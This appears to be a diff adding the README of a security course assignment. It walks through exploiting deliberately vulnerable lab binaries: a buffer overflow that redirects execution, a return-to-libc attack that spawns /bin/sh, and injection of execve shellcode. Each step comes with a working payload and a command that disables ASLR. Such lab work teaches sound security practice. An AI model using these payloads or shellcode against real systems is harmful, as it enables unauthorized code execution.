@@ -1,0 +1,48 @@
+<h1 id="cns-assignment-4">CNS Assignment 4</h1>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>Disable ASLR using <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>.</li>
+<li>Whenever using gdb, first enter <code>unset env LINES</code> and <code>unset env COLUMNS</code> to match gdb and shell environment variables.</li>
+<li>When executing, use complete path e.g. <code>/home/xyz/assignment4/executable</code> instead of <code>./executable</code>.</li>
+<li>All addresses are written in reverse order due to little endianess.</li>
+<li>Remove existing binaries using <code>make clean</code>.</li>
+<li>Compile all programs using <code>make</code>.</li>
+</ul>
+<h2 id="steps-to-reproduce">Steps to reproduce</h2>
+<h3 id="redirect-execution-to-print-access-granted">Redirect execution to print &#39;access granted&#39;</h3>
+<ul>
+<li><p>Get address of instruction just after <code>jmp</code> statement and overflow the buffer to put it in <code>IsPasswordOkay</code>&#39;s return address.</p>
+<p><img src="./screenshots/1.png" alt="Example disassembly from gdb"></p>
+</li>
+<li><p>E.g. <code>/path/to/executable/hackthisprogram1_64.out $(python -c &#39;__import__(&quot;sys&quot;).stdout.buffer.write(b&quot;A&quot;*12+b&quot;B&quot;*16+b&quot;C&quot;*8+b&quot;\x24\x52\x55\x55\x55\x55\x00\x00&quot;)&#39;)</code></p>
+</li>
+</ul>
+<h3 id="return-to-libc-attack">Return to LIBC attack</h3>
+<ul>
+<li><p>Get address of <code>system</code> function from libc using <code>p system</code> in gdb.</p>
+<p><img src="./screenshots/2_system.png" alt="system call address"></p>
+</li>
+<li><p>Get starting and ending address of all memory occupied by libc using <code>info proc map</code>.</p>
+</li>
+<li><p>Get address of <code>/bin/sh</code> string from the libc address space using <code>find &lt;starting addr&gt;,&lt;ending addr&gt;,&quot;/bin/sh&quot;</code>.</p>
+<p><img src="./screenshots/2_libc.png" alt="libc address space"></p>
+</li>
+<li><p>Overflow the buffer to replace return address with address of <code>system</code> function call and address of string <code>/bin/sh</code> as it&#39;s argument.</p>
+</li>
+<li><p>E.g. <code>/path/to/executable/hackthisprogram1_32.out $(python -c &#39;__import__(&quot;sys&quot;).stdout.buffer.write(b&quot;\x41&quot;*24+b&quot;\x40\x98\xc4\xf7&quot;+b&quot;\x42&quot;*4+b&quot;\xaa\xaf\xdb\xf7&quot;)&#39;)</code></p>
+</li>
+</ul>
+<h3 id="shellcode-injection">Shellcode injection</h3>
+<ul>
+<li><p>Get shellcode using <code>make shellcode</code>, which produces 36 byte shellcode.</p>
+</li>
+<li><p>Get starting address of <code>Password</code> buffer using <code>x Password</code> in gdb. This is where shellcode execution will start from.</p>
+<p><img src="./screenshots/3.png" alt="starting address of buffer"></p>
+</li>
+<li><p>Overflow the buffer to replace return address with starting address of <code>Password</code> buffer.</p>
+</li>
+<li><p>Additionally prepend the shellcode with <code>\x91</code>.</p>
+</li>
+<li><p>E.g <code>/path/to/executable/hackthisprogram1_mod_64.out $(python -c &#39;__import__(&quot;sys&quot;).stdout.buffer.write(b&quot;\xeb\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff\x31\xc0\x88\x05\xf7\xff\xff\xff\x48\x8d\x3d\xe9\xff\xff\xff\x50\x57\x48\x89\xe6\x31\xd2\xb0\x3b\x0f\x05&quot;+b&quot;\x41&quot;*36+b&quot;\x50\xd9\xff\xff\xff\x7f\x00\x00&quot;)&#39;)</code></p>
+</li>
+</ul>
